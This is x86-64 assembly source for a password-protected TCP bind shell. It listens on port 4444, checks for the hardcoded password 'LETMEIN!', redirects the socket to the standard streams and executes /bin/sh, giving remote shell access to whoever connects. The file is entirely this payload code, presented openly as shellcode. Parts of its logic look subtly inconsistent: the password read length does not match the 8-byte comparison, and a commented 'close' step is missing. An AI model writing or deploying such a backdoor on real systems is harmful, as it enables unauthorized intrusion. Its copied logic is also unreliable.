; =================================================
;   TCP Bind Shell with Auth
; =================================================

global _start

    ; Syscall numbers
    syscalls.socket equ 0x29
    syscalls.bind   equ 0x31
    syscalls.listen equ 0x32
    syscalls.accept equ 0x2b
    syscalls.close  equ 0x03
    syscalls.dup2   equ 0x21
    syscalls.write  equ 0x01
    syscalls.read   equ 0x00
    syscalls.execve equ 0x3b

    ; Constant definitions
    ipv4    equ 0x02            ; AF_INET
    ipv4.addressLen equ 0x10 
    tcp     equ 0x01            ; SOCK_STREAM

    ; Standard streams
    standardIO.in   equ 0x00
    standardIO.out  equ 0x01
    standardIO.err  equ 0x02

    setup.port      equ 0x5c11 ; 4444

    ;:> echo -n '//bin/sh' | rev | xxd
    ;:  00000000: 6873 2f6e 6962 2f2f hs/nib//
    binshString     equ 0x68732f6e69622f2f

    ;:> echo -n '>>pass?:' | rev | xxd
    ;: 00000000: 3a3f 7373 6170 3e3e :?ssap>>
    passPromptString    equ 0x3a3f737361703e3e

    ; Configs
    config.max_cons equ 0x2
    config.password equ 0x4d54454c214e4945 ; MTEL!NIE > LETMEIN!

section .text

_start:

    xor r14, r14 ; zero out r14 for future use

    ; 1 - Create socket (socket syscall)
    push syscalls.socket
    pop rax
    push ipv4
	pop rdi
    push tcp
	pop rsi
	cdq
	syscall

    ; 2 - Save socket fd and build server struct
    xchg rdi, rax
	
    sub rsp, 0x08
	mov dword [rsp+0x04], r14d
    mov word  [rsp+rax], setup.port
	mov word  [rsp], ax

    ; 3 - Bind to socket
	push syscalls.bind
    pop rax
	mov rsi, rsp
    push ipv4.addressLen
	pop rdx
	syscall

    ; 4 - Listen
	push syscalls.listen
    pop rax
    push config.max_cons
	pop rsi
	syscall

    ; 5 - Accept incoming connection
	push syscalls.accept
    pop rax
	sub rsp, rdx
	mov rsi, rsp
    dec rsp
    mov byte [rsp], ipv4.addressLen
    mov rdx, rsp
    syscall

    ; 6 - Handle incoming connection
	
    ; 6.1 - Save client fd and close parent fd
    mov r9, rax

    ; 6.2 - Read password from the client fd
    read_pass:
        xor rax, rax
        mov rdi, r9
        push 0x04
        pop rdx
        sub rsp, rdx
        mov rsi, rsp
        syscall

    ; 6.3 - Check password
        mov rax, config.password
        mov rdi, rsi
        scasq
    jne read_pass

    ; 7 - Duplicate sockets for the new connection one by one
    push standardIO.err
    pop r15
    loop_through_stdfds:
        mov rdi, r9
        push syscalls.dup2
        pop rax
        mov rsi, r15
        syscall
    dec r15
    jns loop_through_stdfds

    ; 9 - Execve
    push r14
    mov rbx, binshString
    push rbx
    mov rdi, rsp 
    push r14
    mov rdx, rsp
    push rdi
    mov rsi, rsp
    push syscalls.execve
    pop rax
    syscall